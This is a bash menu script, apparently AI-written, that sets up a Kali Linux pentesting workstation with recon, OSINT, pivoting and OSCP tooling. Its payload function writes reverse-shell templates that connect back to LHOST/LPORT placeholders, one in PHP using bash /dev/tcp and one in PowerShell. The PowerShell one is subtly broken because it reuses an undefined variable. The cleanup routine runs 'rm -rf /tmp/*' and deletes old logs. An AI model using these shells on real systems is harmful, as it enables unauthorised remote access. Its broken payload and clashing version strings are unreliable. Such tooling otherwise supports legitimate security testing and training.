#!/bin/bash

# ==============================================================================
# Kali Setup Tool - Ultimate Menu Version (v3.4)
# ==============================================================================
# Description: Professional Grade Engagement Suite.
# Author: Gemini CLI
# ==============================================================================

# --- Configuration & Logging ---
LOG_FILE="kali-setup.log"
exec > >(tee -a "$LOG_FILE") 2>&1

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Get real user info
REAL_USER=${SUDO_USER:-$USER}
USER_HOME=$(eval echo "~$REAL_USER")
DESKTOP_DIR="$USER_HOME/Desktop"
SCRIPT_DIR=$(dirname "$(realpath "$0")")

log() { echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
info() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[-]${NC} $1"; exit 1; }

# --- TUI Helpers ---

check_deps() {
    if ! command -v whiptail &>/dev/null; then
        sudo apt update && sudo apt install -y whiptail
    fi
}

msgbox() {
    whiptail --title "$1" --msgbox "$2" 15 70
}

# --- Core Functions ---

check_prereqs() {
    log "Checking prerequisites..."
    [[ $EUID -ne 0 ]] && error "This script must be run as root."
    ping -c 1 google.com > /dev/null 2>&1 || error "No internet connection."
}

setup_env() {
    log "Configuring environment..."
    export DEBIAN_FRONTEND=noninteractive
    echo "* libraries/restart-without-asking boolean true" | sudo debconf-set-selections
    
    local SCRIPT_PATH=$(realpath "$0")
    if ! grep -q "alias kali-setup" "$USER_HOME/.zshrc" 2>/dev/null; then
        echo "alias kali-setup='sudo $SCRIPT_PATH'" >> "$USER_HOME/.zshrc"
        echo "alias kali-setup='sudo $SCRIPT_PATH'" >> "$USER_HOME/.bashrc"
    fi
}

setup_aliases() {
    log "Configuring pentest aliases..."
    local ALIAS_FILE="$USER_HOME/.kali_aliases"
    cat > "$ALIAS_FILE" <<EOF
# Kali Pentest Aliases
alias l='ls -alh'
alias myip='curl -s https://ifconfig.me'
alias localip="ip a | grep 'inet ' | grep -v '127.0.0.1' | awk '{print \$2}'"
alias listening='sudo lsof -i -P -n | grep LISTEN'
alias update-kali='sudo apt update && sudo apt upgrade -y'
alias serve='python3 -m http.server'
alias sth='search-that-hash'
alias nth='name-that-hash'
alias nxc='netexec'
alias msf='msfconsole -q'
EOF
    
    if ! grep -q "source ~/.kali_aliases" "$USER_HOME/.zshrc" 2>/dev/null; then
        echo "[ -f ~/.kali_aliases ] && source ~/.kali_aliases" >> "$USER_HOME/.zshrc"
        echo "[ -f ~/.kali_aliases ] && source ~/.kali_aliases" >> "$USER_HOME/.bashrc"
    fi
    chown "$REAL_USER:$REAL_USER" "$ALIAS_FILE"
}

create_launcher() {
    local NAME=$1
    local CMD=$2
    local ICON=$3
    local CATEGORY=$4
    local TARGET="$DESKTOP_DIR/$NAME.desktop"

    local BIN_NAME=$(echo $CMD | awk '{print $1}')
    if ! command -v "$BIN_NAME" &>/dev/null && [[ ! -f "$BIN_NAME" ]]; then
        return
    fi

    cat > "$TARGET" <<EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=$NAME
Comment=Launched via Kali Setup
Exec=$CMD
Icon=$ICON
Terminal=true
StartupNotify=false
Categories=$CATEGORY;
EOF
    chmod +x "$TARGET"
    chown "$REAL_USER:$REAL_USER" "$TARGET"
    gio set -t string "$TARGET" metadata::xfce-exe-checksum "$(sha256sum "$TARGET" | awk '{print $1}')" 2>/dev/null
}

# --- Installation Modules ---

install_base() {
    log "Installing base system tools..."
    sudo apt update -y && sudo apt upgrade -y
    sudo apt install -y git perl tree htop gdu python3-pip python3-venv \
        curl wget npm jq nmap chromium parallel bleachbit exploitdb btop \
        dos2unix pipx rlwrap feroxbuster gobuster proxychains4 docker.io
    sudo systemctl enable docker --now
    if [ -n "$SUDO_USER" ]; then sudo usermod -aG docker "$SUDO_USER"; fi

    # Create Launchers for Base Tools
    create_launcher "Btop" "btop" "btop" "System;Monitor"
    create_launcher "Chromium" "chromium" "chromium" "Network;WebBrowser"
    create_launcher "BleachBit" "bleachbit" "bleachbit" "System;Settings"
}

install_python_env() {
    log "Configuring Python tools via Pipx..."
    local RUN_AS="sudo -u $REAL_USER"
    $RUN_AS pipx ensurepath
    local TOOLS=("bbot" "search-that-hash" "name-that-hash" "mitmproxy" "autopwn-suite" "spiderfoot" "holehe" "maigret" "h8mail" "ghunt")
    for t in "${TOOLS[@]}"; do
        $RUN_AS pipx install "$t" --force
    done
}

install_go() {
    log "Installing latest Go..."
    local LATEST_GO=$(curl -s https://go.dev/VERSION?m=text | head -n 1)
    if [[ ! -d "/usr/local/go" ]] || [[ $(/usr/local/go/bin/go version 2>/dev/null) != *"$LATEST_GO"* ]]; then
        curl -LO "https://golang.org/dl/${LATEST_GO}.linux-amd64.tar.gz"
        sudo rm -rf /usr/local/go
        sudo tar -C /usr/local -xzf "${LATEST_GO}.linux-amd64.tar.gz"
        rm "${LATEST_GO}.linux-amd64.tar.gz"
    fi
    export PATH="$PATH:/usr/local/go/bin:~/go/bin"
}

install_heavy_automation() {
    log "Installing Heavy Recon Automation..."
    local OPT_DIR="/opt"
    sudo mkdir -p "$OPT_DIR"
    
    # 3klCon
    sudo git clone --depth 1 https://github.com/eslam3kl/3klCon.git "$OPT_DIR/3klCon" 2>/dev/null
    
    # reNgine
    sudo git clone --depth 1 https://github.com/yogeshojha/rengine.git "$OPT_DIR/rengine" 2>/dev/null
    
    # Osmedeus & Nuclei
    local GO_BIN="/usr/local/go/bin/go"
    if [[ -f "$GO_BIN" ]]; then
        $GO_BIN install github.com/j3ssie/osmedeus@latest
        $GO_BIN install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    fi

    # Create Launchers
    create_launcher "Osmedeus" "$USER_HOME/go/bin/osmedeus" "kali-menu" "Network;Recon"
    create_launcher "Nuclei" "$USER_HOME/go/bin/nuclei" "kali-menu" "Network;Vulnerability"
}

install_oscp() {
    log "Installing OSCP tools..."
    local RUN_AS="sudo -u $REAL_USER"
    sudo apt install -y smbmap nikto snmp-check enum4linux-ng
    $RUN_AS pipx install netexec --force
    $RUN_AS pipx install bloodhound --force
    $RUN_AS pipx install impacket --force
    
    # Ligolo-ng
    local LIGOLO_VER=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | jq -r .tag_name)
    wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_linux_amd64.tar.gz" -O /tmp/ligolo_agent.tar.gz
    wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER#v}_linux_amd64.tar.gz" -O /tmp/ligolo_proxy.tar.gz
    sudo tar -C /usr/local/bin -xzf /tmp/ligolo_agent.tar.gz agent && sudo mv /usr/local/bin/agent /usr/local/bin/ligolo-agent
    sudo tar -C /usr/local/bin -xzf /tmp/ligolo_proxy.tar.gz proxy && sudo mv /usr/local/bin/proxy /usr/local/bin/ligolo-proxy
    rm /tmp/ligolo_*.tar.gz
    
    local GO_BIN="/usr/local/go/bin/go"
    if [[ -f "$GO_BIN" ]]; then
        $GO_BIN install github.com/jpillora/chisel@latest
    fi
    sudo git clone --depth 1 https://github.com/peass-ng/PEASS-ng.git "/opt/peass-ng" 2>/dev/null

    # Create Launchers
    create_launcher "NetExec" "$USER_HOME/.local/bin/nxc" "kali-menu" "Network;Exploitation"
    create_launcher "BloodHound" "$USER_HOME/.local/bin/bloodhound-python" "kali-menu" "Network;Exploitation"
}

# --- Pro Operational Modules ---

setup_api_vault() {
    log "Entering API Vault Configuration..."
    local SHODAN_KEY=$(whiptail --title "API Vault" --inputbox "Enter Shodan API Key (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)
    local VT_KEY=$(whiptail --title "API Vault" --inputbox "Enter VirusTotal API Key (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)
    local CENSYS_ID=$(whiptail --title "API Vault" --inputbox "Enter Censys ID (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)
    local CENSYS_SECRET=$(whiptail --title "API Vault" --inputbox "Enter Censys Secret (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)

    # Example: Inject into BBOT config
    if [[ -n "$SHODAN_KEY" ]]; then
        mkdir -p "$USER_HOME/.config/bbot"
        echo "modules:" > "$USER_HOME/.config/bbot/bbot.yml"
        echo "  shodan:" >> "$USER_HOME/.config/bbot/bbot.yml"
        echo "    api_key: $SHODAN_KEY" >> "$USER_HOME/.config/bbot/bbot.yml"
        info "Shodan key injected into BBOT config."
    fi
    # Additional injection logic for h8mail, Spiderfoot etc. would go here
    msgbox "API Vault" "Keys processed. (Note: Encryption-at-rest not yet implemented for these plain configs)."
}

setup_wordlists_payloads() {
    log "Configuring Wordlists & Payloads..."
    sudo apt install -y seclists
    # Unpack RockYou
    if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    fi
    
    mkdir -p "$USER_HOME/Payloads"
    # Create simple shell templates
    cat > "$USER_HOME/Payloads/php-reverse.php" <<EOF
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
EOF
    cat > "$USER_HOME/Payloads/powershell-rev.ps1" <<EOF
\$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendbyte);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
EOF
    chown -R "$REAL_USER:$REAL_USER" "$USER_HOME/Payloads"
    info "SecLists ready and Payloads directory initialized."
}

setup_pro_browser() {
    log "Hardening Firefox for Pentesting..."
    sudo apt install -y firefox-esr
    
    # 1. Automate via Firefox Policies
    local POLICY_DIR="/usr/lib/firefox-esr/distribution"
    sudo mkdir -p "$POLICY_DIR"
    cat <<EOF | sudo tee "$POLICY_DIR/policies.json"
{
  "policies": {
    "Proxy": {
      "Mode": "manual",
      "Locked": false,
      "HTTPProxy": "127.0.0.1:8080",
      "UseHTTPProxyForAllProtocols": true,
      "Passthrough": "localhost, 127.0.0.1"
    },
    "Extensions": {
      "Install": [
        "https://addons.mozilla.org/firefox/downloads/latest/foxyproxy-standard/latest.xpi",
        "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi",
        "https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi"
      ]
    },
    "Certificates": {
       "Install": ["/usr/local/share/ca-certificates/BurpSuiteCA.crt"]
    }
  }
}
EOF
    
    # 2. Prepare Burp CA placeholder (User still needs to export it to this path once)
    sudo touch /usr/local/share/ca-certificates/BurpSuiteCA.crt
    sudo update-ca-certificates 2>/dev/null

    info "Firefox hardened via system-wide policies (Proxy configured, Extensions queued)."
}

disable_power_management() {
    log "Disabling Power Saving, Screensaver, and Sleep Targets..."
    local RUN_AS="sudo -u $REAL_USER"
    
    # XFCE
    if command -v xfconf-query &>/dev/null; then
        log "Configuring XFCE Power Settings..."
        # Screensaver
        $RUN_AS xfconf-query -c xfce4-screensaver -p /saver/enabled -n -t bool -s false 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-screensaver -p /lock-screen/enabled -n -t bool -s false 2>/dev/null
        
        # Power Manager - AC
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/blank-on-ac -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-ac-sleep -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-ac-off -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/inactivity-on-ac -n -t int -s 0 2>/dev/null
        
        # Power Manager - Battery
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/blank-on-battery -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-battery-sleep -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-battery-off -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/inactivity-on-battery -n -t int -s 0 2>/dev/null
        
        # General
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/lock-screen-suspend-hibernate -n -t bool -s false 2>/dev/null
    fi
    
    # GNOME
    if command -v gsettings &>/dev/null; then
        log "Configuring GNOME Power Settings..."
        $RUN_AS gsettings set org.gnome.desktop.session idle-delay 0 2>/dev/null
        $RUN_AS gsettings set org.gnome.desktop.screensaver lock-enabled false 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-timeout 0 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-timeout 0 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type 'nothing' 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-type 'nothing' 2>/dev/null
    fi
    
    # General X11
    if command -v xset &>/dev/null; then
        $RUN_AS xset s off 2>/dev/null
        $RUN_AS xset -dpms 2>/dev/null
    fi

    # System-wide Masking (Absolute Always On)
    log "Applying System-wide Sleep Masking..."
    systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
    
    info "Power saving and screensaver disabled (System-wide)."
}

setup_pro_networking() {
    local SUB=$(whiptail --title "Advanced Networking" --menu "Select Option:" 15 60 5 \
        "1" "Configure Proxychains (Auto-Tor)" \
        "2" "Persistent Ligolo-ng Service" \
        "3" "VPN Profile Manager (OpenVPN)" \
        "4" "Back" 3>&1 1>&2 2>&3)

    case $SUB in
        1)
            log "Configuring Proxychains for Tor..."
            sudo apt install -y tor
            sudo systemctl enable tor --now
            sudo sed -i 's/#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf
            sudo sed -i 's/strict_chain/#strict_chain/' /etc/proxychains4.conf
            info "Proxychains configured to use dynamic chain with Tor."
            ;;
        2)
            log "Creating Ligolo-ng background service..."
            cat <<EOF | sudo tee /etc/systemd/system/ligolo-proxy.service
[Unit]
Description=Ligolo-ng Proxy Service
After=network.target
[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/ligolo-proxy -selfcert
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
            sudo systemctl daemon-reload
            sudo systemctl enable ligolo-proxy --now
            info "Ligolo-ng is now running as a persistent background service."
            ;;
        3) mkdir -p "$USER_HOME/Documents/VPN"; msgbox "VPN" "Profiles directory: ~/Documents/VPN";;
    esac
}

# --- System Audit & Theme ---

run_audit() {
    log "Running System Audit..."
    local REPORT="[System] Disk Free: $(df -h / | awk 'NR==2 {print $4}')\n\n"
    
    # Smarter detection for tools that might not be in the current script's PATH yet
    check_tool() {
        local TOOL_NAME=$1
        # 1. Check standard path
        if command -v "$TOOL_NAME" &>/dev/null; then echo "OK"; return; fi
        # 2. Check Pipx/Local bin
        if [[ -f "$USER_HOME/.local/bin/$TOOL_NAME" ]]; then echo "OK (Local Path)"; return; fi
        # 3. Check Go bin
        if [[ -f "/usr/local/go/bin/$TOOL_NAME" ]]; then echo "OK (/usr/local/go)"; return; fi
        if [[ -f "$USER_HOME/go/bin/$TOOL_NAME" ]]; then echo "OK (Go Path)"; return; fi
        
        echo "MISSING"
    }

    local TOOLS=("nmap" "msfconsole" "docker" "pipx" "go" "bbot" "nuclei" "osmedeus" "netexec")
    for t in "${TOOLS[@]}"; do 
        REPORT+="[Tool] $t: $(check_tool "$t")\n"
    done

    REPORT+="\nNOTE: If tools show as OK (Local Path) or OK (Go), you may need to restart your terminal or run 'source ~/.zshrc' for them to be available in your current session."
    
    msgbox "System Health Audit" "$REPORT"
}

backup_config() {
    log "Backing up configurations..."
    local BACKUP_DIR="$USER_HOME/Kali_Backup_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$BACKUP_DIR"
    cp "$USER_HOME/.zshrc" "$BACKUP_DIR/" 2>/dev/null
    cp "$USER_HOME/.bashrc" "$BACKUP_DIR/" 2>/dev/null
    cp "$USER_HOME/.kali_aliases" "$BACKUP_DIR/" 2>/dev/null
    [[ -d "$USER_HOME/.config/bbot" ]] && cp -r "$USER_HOME/.config/bbot" "$BACKUP_DIR/"
    chown -R "$REAL_USER:$REAL_USER" "$BACKUP_DIR"
    msgbox "Backup" "Configs backed up to: $BACKUP_DIR"
}

repair_desktop_icons() {
    log "Repairing desktop icons..."
    local RUN_AS="sudo -u $REAL_USER"
    if command -v gio &>/dev/null; then
        for f in "$DESKTOP_DIR"/*.desktop; do
            [[ -f "$f" ]] || continue
            gio set -t string "$f" metadata::xfce-exe-checksum "$(sha256sum "$f" | awk '{print $1}')" 2>/dev/null
        done
    fi
    msgbox "Repair" "Desktop icon metadata refreshed."
}

cleanup_system() {
    log "Cleaning system..."
    sudo apt autoremove -y
    sudo apt clean
    sudo rm -rf /tmp/*
    # Clear logs older than 7 days
    sudo find /var/log -type f -name "*.log" -mtime +7 -delete
    msgbox "Cleanup" "System cleanup complete."
}

install_xfce_desktop() {
    log "Installing XFCE..."
    sudo apt install -y kali-desktop-xfce xfce4-panel
    msgbox "XFCE Installed" "XFCE Desktop Environment has been installed.\n\nIMPORTANT: You MUST log out and select 'XFCE Session' from the login screen (or restart the system) before features like Undercover Mode or XFCE theme settings will work."
}

set_wallpaper() {
    local WP_DIR="Wallpapers"
    if [[ ! -d "$WP_DIR" ]]; then
        msgbox "Error" "Wallpaper directory not found: $WP_DIR"
        return
    fi

    local OPTIONS=()
    while IFS= read -r file; do
        OPTIONS+=("$file" "")
    done < <(ls "$WP_DIR")

    local CHOICE=$(whiptail --title "Set Desktop Wallpaper" --menu "Select a wallpaper:" 20 70 10 "${OPTIONS[@]}" 3>&1 1>&2 2>&3)
    
    if [[ -n "$CHOICE" ]]; then
        local WP_PATH=$(realpath "$WP_DIR/$CHOICE")
        local DE=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:lower:]' '[:upper:]')
        local RUN_AS="sudo -u $REAL_USER"
        
        # Try to find DBUS session address to allow desktop commands to work via sudo
        local USER_ID=$(id -u "$REAL_USER")
        local DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus"

        if [[ "$DE" == *"XFCE"* ]]; then
            # XFCE: Usually has multiple monitors/workspaces, setting for the main one
            local PROPERTIES=($($RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xfce4-desktop -l | grep last-image))
            for p in "${PROPERTIES[@]}"; do
                $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xfce4-desktop -p "$p" -s "$WP_PATH"
            done
            info "Wallpaper updated for XFCE: $CHOICE"
        elif [[ "$DE" == *"GNOME"* ]]; then
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.background picture-uri "file://$WP_PATH"
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.background picture-uri-dark "file://$WP_PATH"
            info "Wallpaper updated for GNOME: $CHOICE"
        else
            # Fallback using feh if installed
            if command -v feh &>/dev/null; then
                $RUN_AS feh --bg-fill "$WP_PATH"
                info "Wallpaper updated via feh: $CHOICE"
            else
                msgbox "Desktop Not Supported" "Detected DE ($DE) is not natively supported for wallpaper switching and 'feh' is not installed."
            fi
        fi
        msgbox "Wallpaper Updated" "Wallpaper has been set to: $CHOICE"
    fi
}

set_theme() {
    local OPTIONS=(
        "Kali-Dark" "The classic Kali dark look"
        "Kali-Light" "Bright and clean theme"
        "Kali-Purple" "Modern purple accented theme"
        "Adwaita-dark" "Standard GNOME dark theme"
    )

    local CHOICE=$(whiptail --title "Change GTK System Theme" --menu "Select a theme:" 18 70 6 "${OPTIONS[@]}" 3>&1 1>&2 2>&3)

    if [[ -n "$CHOICE" ]]; then
        local DE=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:lower:]' '[:upper:]')
        local RUN_AS="sudo -u $REAL_USER"
        
        # Try to find DBUS session address
        local USER_ID=$(id -u "$REAL_USER")
        local DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus"
        log "Applying GTK Theme: $CHOICE (Detected DE: $DE)"

        if [[ "$DE" == *"XFCE"* ]]; then
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xsettings -p /Net/ThemeName -s "$CHOICE" 2>/dev/null
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xfwm4 -p /general/theme -s "$CHOICE" 2>/dev/null
            info "GTK and XFWM4 Theme updated for XFCE: $CHOICE"
        elif [[ "$DE" == *"GNOME"* ]]; then
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.interface gtk-theme "$CHOICE" 2>/dev/null
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.interface color-scheme 'prefer-dark' 2>/dev/null
            info "GTK Theme updated for GNOME: $CHOICE"
        else
            msgbox "Desktop Not Supported" "Detected DE ($DE) is not natively supported for theme switching via this script."
        fi
        msgbox "Theme Updated" "System theme has been set to: $CHOICE"
    fi
}

toggle_undercover() {
    local DE=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:lower:]' '[:upper:]')
    if [[ "$DE" == *"XFCE"* ]]; then
        sudo -u "$REAL_USER" kali-undercover
    else
        msgbox "XFCE Required" "Kali Undercover mode REQUIRES an active XFCE session.\n\nIf you just installed XFCE, you MUST log out and select 'XFCE Session' at the login screen (or restart) before this will work."
    fi
}

theme_menu() {
    local SUB=$(whiptail --title "Appearance & Theme Manager" --menu \
        "NOTE: Some features are DE-specific.\nSelect an option:" 18 70 6 \
        "1" "Set Desktop Wallpaper" \
        "2" "Change GFCE System Theme" \
        "3" "Toggle Undercover Mode (XFCE REQUIRED)" \
        "4" "Install XFCE Desktop Environment" \
        "5" "Back to Main Menu" 3>&1 1>&2 2>&3)
    case $SUB in
        1) set_wallpaper ;;
        2) set_theme ;;
        3) toggle_undercover ;;
        4) install_xfce_desktop ;;
    esac
}

# --- Menu Logic ---

explanation_menu() {
    while true; do
        local CAT=$(whiptail --title "Tool Explanations" --menu "Select a category to explore:" 20 70 10 \
            "1" "Reconnaissance & OSINT" \
            "2" "Leak & Credential Scanning" \
            "3" "OSCP & Exam Approved" \
            "4" "Web Application Analysis" \
            "5" "Vulnerability & Exploitation" \
            "6" "Operational Modules" \
            "7" "Setup Type Tool Lists" \
            "8" "Back to Main Menu" 3>&1 1>&2 2>&3)

        [[ -z "$CAT" || "$CAT" == "8" ]] && return

        case $CAT in
            7)
                local TYPE=$(whiptail --title "Setup Tool Lists" --menu "Choose a setup type:" 15 60 5 \
                    "1" "Full Pro Setup List" \
                    "2" "OSCP-Only Setup List" 3>&1 1>&2 2>&3)
                
                if [[ "$TYPE" == "1" ]]; then
                    whiptail --title "Full Pro Setup List" --msgbox "The 'Ultimate' Build. Includes:
• All Base Tools (btop, nmap, etc.)
• Full OSCP Suite (NetExec, Ligolo-ng, etc.)
• Heavy Recon (Osmedeus, Nuclei, reNgine, 3klCon)
• OSINT Suite (Holehe, Maigret, h8mail, GHunt)
• Wordlists (SecLists + Unpacked RockYou)
• Pro Modules (Firefox Hardening, Ligolo Service)
• Stability (Always-On Power Mode)" 20 70
                elif [[ "$TYPE" == "2" ]]; then
                    whiptail --title "OSCP-Only Setup List" --msgbox "Strictly follows 2026 OSCP+ exam rules:
• Recon: Feroxbuster, Gobuster, Nikto
• Network: NetExec, BloodHound.py, Impacket
• Pivoting: Ligolo-ng, Chisel
• PrivEsc: PEASS-ng (WinPEAS/LinPEAS)
• Utilities: Smbmap, Snmp-check, Enum4linux-ng" 18 70
                fi
                ;;
            1)
                whiptail --title "Recon & OSINT" --msgbox "• BBOT: OSINT automation for subdomains, emails, cloud.
• 3klCon: Combines multiple scanners for automated recon.
• Osmedeus: Offensive framework for automated vuln scanning.
• reNgine: Visual recon engine (runs via Docker)." 15 70
                ;;
            2)
                whiptail --title "Leak & Credentials" --msgbox "• Holehe: Checks email registrations on 120+ sites.
• Maigret: Username searches across 3000+ sites.
• h8mail: Breach hunting and password leak analysis.
• GHunt: Google Account investigation tool." 15 70
                ;;
            3)
                whiptail --title "OSCP Approved" --msgbox "• Feroxbuster: Recursive content discovery.
• NetExec: Modern AD/Network exploitation tool.
• Ligolo-ng: High-performance pivoting tunnel.
• BloodHound.py: AD domain analysis ingestor." 15 70
                ;;
            4)
                whiptail --title "Web App Analysis" --msgbox "• Wappalyzer: Tech stack identification.
• Nikto: Web server vulnerability scanner.
• Gobuster/Feroxbuster: Directory and DNS brute-forcing." 15 70
                ;;
            5)
                whiptail --title "Vuln & Exploitation" --msgbox "• Nuclei: Fast, template-based vulnerability scanner.
• SearchSploit: Local Exploit-DB search interface.
• Sliver C2: Cross-platform command and control framework." 15 70
                ;;
            6)
                whiptail --title "Operational Modules" --msgbox "• Hardened Firefox: Pre-configured for Burp and privacy.
• Persistent Tunnels: Ligolo-ng as a system service.
• Power Stability: Ensures the system never sleeps during scans." 15 70
                ;;
        esac
    done
}

show_menu() {
    local CHOICE=$(whiptail --title "Kali Setup Tool v3.6" --menu "Select Option:" 26 75 17 \
        "1" "Full Setup (Everything + Pro Suites)" \
        "2" "OSCP-Only Setup" \
        "3" "Heavy Recon Automation" \
        "4" "Leak & Credential Scan Suite" \
        "5" "Update All Tools" \
        "6" "Appearance & Theme Manager" \
        "7" "Pro Browser: Hardened Firefox" \
        "8" "Advanced Networking (Ligolo/Proxy)" \
        "9" "API Key Vault (Secrets Manager)" \
        "10" "Wordlists & Payload Optimization" \
        "11" "Power Management: Always On Mode" \
        "12" "System Audit & Health Check" \
        "13" "Tool Explanations" \
        "14" "Backup Config" \
        "15" "Repair Desktop Icons" \
        "16" "Cleanup System" \
        "17" "Exit" 3>&1 1>&2 2>&3)

    case $CHOICE in
        1) check_prereqs; setup_env; setup_aliases; install_base; install_go; install_python_env; install_oscp; install_heavy_automation; setup_wordlists_payloads; setup_pro_browser; disable_power_management; msgbox "Success" "Full Pro Setup Complete!";;
        2) check_prereqs; setup_env; install_oscp; msgbox "Success" "OSCP Setup Complete!";;
        3) install_go; install_heavy_automation; msgbox "Success" "Heavy Recon Automation tools (reNgine, 3klCon, Osmedeus) installed!";;
        4) install_python_env; msgbox "Success" "Leak Suite Installed!";;
        5) if [[ -f "$SCRIPT_DIR/update.sh" ]]; then
               sudo "$SCRIPT_DIR/update.sh"
               msgbox "Update" "System and tools update process completed."
           else
               msgbox "Error" "Update script (update.sh) not found in $SCRIPT_DIR"
           fi ;;
        6) theme_menu ;;
        7) setup_pro_browser; msgbox "Success" "Firefox hardened with system-wide policies and extensions queued." ;;
        8) setup_pro_networking ;;
        9) setup_api_vault ;;
        10) setup_wordlists_payloads; msgbox "Success" "SecLists installed, RockYou unpacked, and ~/Payloads directory initialized." ;;
        11) disable_power_management; msgbox "Success" "Power management disabled." ;;
        12) run_audit ;;
        13) explanation_menu ;;
        14) backup_config ;;
        15) repair_desktop_icons ;;
        16) cleanup_system ;;
        17) exit 0 ;;
    esac
}

# --- Start ---
check_deps
python3 -c "import sys; content = open('kali-setup.sh', 'rb').read().replace(b'\r\n', b'\n'); open('kali-setup.sh', 'wb').write(content)" 2>/dev/null
while true; do show_menu; done
